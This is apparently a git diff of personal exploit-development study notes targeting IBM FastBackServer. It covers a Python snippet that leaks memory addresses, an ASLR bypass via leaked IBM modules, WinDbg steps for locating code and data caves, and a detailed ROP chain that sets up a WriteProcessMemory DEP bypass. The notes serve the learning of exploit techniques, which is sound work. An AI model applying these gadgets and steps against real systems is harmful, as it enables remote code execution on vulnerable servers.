@@ -211,20 +211,33 @@ struct sockaddr_in {
 	1. `response_address = parse_response(response) // print(str(hex(response_address)))`
 	
 ```
+	...
+    response = s.recv(1024)
+    print(response)
+    address = parse_response
+    if address:
+        address = hex(int(parse_response(response),16))
+        print(address)
+    
+    s.close()
+    sys.exit(0)
+
+
 def parse_response(response):
     pattern = b"Address is: "
     offset = response.find(pattern)
-    if offset != -1:      
-        addr_start = offset + len(pattern) + 2
-        response = response[addr_start:addr_start+8]      
+    if offset != -1:
+        addr_start = offset + len(pattern)
+        response = response[addr_start:addr_start+10]
         return response
-    return "Invalid input received"
+    print("Invalid response received")
+    return 0
 ```
 
 --- 
 # Expanding the Exploit (ASLR Bypass)
 
-Previously we were able to retrieve an address to `WriteProcessMemory` which also gave a pointer to `kernel32.dll`. However, every monthly Windows update will change the offsets of symbols within this module, breaking any ROP gadgets used by the exploit. To make this exploit more resilient, we can leak the baked in IBM modules instead and build ROP gadgets from those, meaning that the exploit will only be dependent on the version of FastBackServer (vs the version of Windows)
+By retrieving the address of `WriteProcessMemory` the program also revealed information about the location of `kernel32.dll`. However, every monthly Windows update will change the offsets of symbols within this module, breaking any ROP gadgets used by the exploit. To make this exploit more resilient, we can leak the baked in IBM modules instead and build ROP gadgets from those, meaning that the exploit will only be dependent on the version of FastBackServer (vs the version of Windows)
 
 ### Leaking an IBM Module
 List loaded IBM modules and their locations. From there select a suitable module to pass to the information leak vulnerability to determine its runtime address and start building the ROP chain.
@@ -258,9 +271,10 @@ ProcMon : Process Monitor
 --- 
 # WriteProcessMemory DEP Bypass
 
-In the previous DEP bypass VirtualAlloc was used to modify the protections of the stack where the shellcode lives. Here a new technique is used via WriteProcessMemory to copy our shellcode from the stack into an allocated module's code page. Specifically, copy the shellcode into `libeay32IBM019` which is already executable. Typically a code page is not writeable, but WriteProcessMemory will take care of this.
+In the previous DEP bypass VirtualAlloc was used to modify the protections of the stack where the shellcode lives. Here a new technique is used via WriteProcessMemory to copy the shellcode from the stack into an allocated module's code page. Specifically, copy the shellcode into `libeay32IBM019` which is already executable. Typically a code page is not writeable, but WriteProcessMemory will take care of this.
 
 https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+
 ### WriteProcessMemory
 ```
 BOOL WriteProcessMemory(
@@ -274,38 +288,44 @@ BOOL WriteProcessMemory(
 - hProcess is a handle to the desired process, in this case -1 will get the current process. The intent is to perform a copy operations in the current process
 - lpBaseAddress is the absolute memory address in the code section where the new code will be written. The exploit should avoid overwriting existing code.
 	- Compiled code is page-aligned. When the opcodes don't use up the whole page the rest of the page will be nulled (0x00's). This can be used to find where the "code cave" (space for the new injected code) begins
-
-- D: Attach to FastBack, pause exec
-- Offset to PE header is located at offset 0x3C from the MZ header
-	- [[Portable Executable (PE)]]
-	- dd libeay32IBM019 + 3c L1
-	- PE Header Offset: 00000108
-- Offset to code section is 0x2C from PE Header
-	- dd libeay32IBM019 +0x108 + 2c
-	- Code Segment Offset: 00001000 (from base addr)
-- ? libeay32IBM019 + 1000 = 031c1000
-- !address 032c1000
-- see End Address: 03250300
-- subtract an arbitrary large space (400) from End Address to determine if theres space to write a shellcode in the code cave
-- see a bunch of 00's? Then this is unused space we can use
-- Protections are still PAGE_EXECUTE_READ
-- Find the offset into the module where the code cave starts
-	- 03253000 - 400 - libeay32IBM019 = 00092c00
-	- this has a null byte, but we can just use 092c04 instead
-- So lpBaseAddress will be libeay32IBM019 + 092c04
-
 - lpBuffer is the source of the write, so it must take the stack address of the overflowed shellcode
 - nSize is the size of the shellcode
 - `*lpNumberOfBytesWritten` is a location where the function will report the number of bytes written 
 	- Use an address in the data section of `libeay32IBM019` since it wont have to be gathered at runtime
-- !dh -a libeay32IBM019, to dump data section and header info
-	- Look for: SECTION HEADER #4 // .data name // F018 virtual size // D5000 virtual address
-	- size is 0xf018 and offset is 0x5000
-- Again, this is page aligned and any unused space is nulled, so find the "data cave" using the previous info
-- ? libeay32IBM019 + d5000 + f018 + 4 = 032a401c
-- dd 032a401c, shows a bunch of null bytes
-- !vprot ADDR, shows the section is set as PAGE_READWRITE
-- ? ADDR - libeay32IBM019, shows offset of data writeable section from base address
+	
+[[WriteProcessMemory (WPM)]]
+
+
+Find Unused Memory in the Code Section:
+1. Attach to FastBack, pause exec
+2. Offset to PE header is located at offset 0x3C from the MZ header
+	-  [[Portable Executable (PE)]]
+	1. dd libeay32IBM019 + 3c L1
+	2. PE Header Offset: 00000108
+1. Offset to code section is 0x2C from PE Header
+	1. dd libeay32IBM019 +0x108 + 2c
+	2. Code Segment Offset: 00001000 (from base addr)
+2. ? libeay32IBM019 + 1000 = 031c1000
+3. !address 032c1000
+4. see End Address: 03250300
+5. subtract an arbitrary large space (400) from End Address to determine if there's space to write a shellcode in the code cave
+6. see a bunch of 00's? Then this is unused space we can use
+7. Protections are still PAGE_EXECUTE_READ
+8. Find the offset into the module where the code cave starts
+	1. 03253000 - 400 - libeay32IBM019 = 00092c00
+	1. this has a null byte, but we can just use 092c04 instead
+9. So lpBaseAddress will be libeay32IBM019 + 092c04
+
+Find Unused Memory in the Data Section:
+> `!dh` is also applicable for finding the Code Section
+1. !dh -a libeay32IBM019, to dump data section and header info
+	1. Look for: SECTION HEADER #4 // .data name // F018 virtual size // D5000 virtual address
+	2. size is 0xf018 and offset is 0x5000
+2. Again, this is page aligned and any unused space is nulled, so find the "data cave" using the previous info
+3. ? libeay32IBM019 + d5000 + f018 + 4 = 032a401c
+4. dd 032a401c, shows a bunch of null bytes
+5. !vprot ADDR, shows the section is set as PAGE_READWRITE
+6. ? ADDR - libeay32IBM019, shows offset of data writeable section from base address
 
 Make the API call with ROP
 - Set up the python script to the point where it triggers the scanf buffer overflow
@@ -319,44 +339,44 @@ Make the API call with ROP
 
 ROP chain creation
 - Since ASLR is on, given ROP address from rp++ are not accurate. rp++ calculates from the PE header preferred base address, so we need to subtract the base to get the offset. In exploit use `dllBase + OFFSET` instead of the raw value given by rp++
-	- D:  `dd libeay32IBM019 + 3c L1`
-		- PE header offset value stored at 0x3c from module start
-	- D:  `dd libeay32IBM019 + 108 + 34 L1`
-		-  ImageBase (Preferred base address) is at offset 0x34 in PE header
-	- Outputs value 0x10000000
+- D:  `dd libeay32IBM019 + 3c L1`
+	- PE header offset value stored at 0x3c from module start
+- D:  `dd libeay32IBM019 + 108 + 34 L1`
+	-  ImageBase (Preferred base address) is at offset 0x34 in PE header
+- Outputs value 0x10000000
 ROP chain to set lpBuffer 
 Align a register (eax) to the dummy shellcode location on the stack
-	- `push esp ; pop esi ; ret  # store a copy of esp
-	- `mov eax, esi ; pop esi ; ret  # move value to eax for manipulation`
-		- pack junk
-	- `pop ecx ; ret  # pop in large value avoiding bad chars`
-		- pack 0x77777878
-	- `add eax, ecx ; ret  # add large val to eax`
-	- `pop ecx ; ret  # pop in another large val to trigger bit overflow`
-		- pack 0x88888888
-	- `add eax, ecx ; ret  # add large val to eax`
-	- 0x77777878 + 0x88888888 = 0x...1'00000100 (where the 33rd bit is overflowed)
-	- `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010  # move eax val to ecx`
-		- oof lots of side effects
-		- pack junk for pop into esi
-	- `pop eax ; ret  # pop val (-0x120) into eax`
-		- pack junk x4 for previous retn 0x0010 (used in stdcall convention where callee cleans out stack args, in this case 4 args)
-		- pack 0xfffffee0 for pop
-	- `add eax, ecx ; ret`
-	- `mov [eax], ecx ; ret  # place shellcode adderss in lpBuffer argument location`
+- `push esp ; pop esi ; ret  # store a copy of esp
+- `mov eax, esi ; pop esi ; ret  # move value to eax for manipulation`
+	- pack junk
+- `pop ecx ; ret  # pop in large value avoiding bad chars`
+	- pack 0x77777878
+- `add eax, ecx ; ret  # add large val to eax`
+- `pop ecx ; ret  # pop in another large val to trigger bit overflow`
+	- pack 0x88888888
+- `add eax, ecx ; ret  # add large val to eax`
+- 0x77777878 + 0x88888888 = 0x...1'00000100 (where the 33rd bit is overflowed)
+- `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010  # move eax val to ecx`
+	- oof lots of side effects
+	- pack junk for pop into esi
+- `pop eax ; ret  # pop val (-0x120) into eax`
+	- pack junk x4 for previous retn 0x0010 (used in stdcall convention where callee cleans out stack args, in this case 4 args)
+	- pack 0xfffffee0 for pop
+- `add eax, ecx ; ret`
+- `mov [eax], ecx ; ret  # place shellcode adderss in lpBuffer argument location`
 
 ROP chain to set nSize (size of shellcode)
-	- `inc eax ; ret  # move pointer by 1 byte toward next arg on stack`
-		- x4 to move a word
-	- `push eax ; pop esi ; ret  # save the argument addr in eax to new reg esi`
-	- `pop eax ; ret  # pop -524 into eax (shellcode size approx)`
-		- pack 0xfffffdf4
-	- `neg eax ; ret  # negate`
-	- `mov ecx, eax ; mov eax, esi ; pop esi ; ret 0x0010  # move 524 to ecx, move back argument addr to eax`
-		- side effectsssssss
-		- pack junk for pop into esi
-	- `mov [eax], ecx ; ret  # move 524 into nSize argument`
-		- pack junk x4 for retn 0x0010
+- `inc eax ; ret  # move pointer by 1 byte toward next arg on stack`
+	- x4 to move a word
+- `push eax ; pop esi ; ret  # save the argument addr in eax to new reg esi`
+- `pop eax ; ret  # pop -524 into eax (shellcode size approx)`
+	- pack 0xfffffdf4
+- `neg eax ; ret  # negate`
+- `mov ecx, eax ; mov eax, esi ; pop esi ; ret 0x0010  # move 524 to ecx, move back argument addr to eax`
+	- side effectsssssss
+	- pack junk for pop into esi
+- `mov [eax], ecx ; ret  # move 524 into nSize argument`
+	- pack junk x4 for retn 0x0010
 
 test rop chain pushes args
 - `bp libeay32IBM019+0x1fd8`, breakpoint on gadget that sets stack values
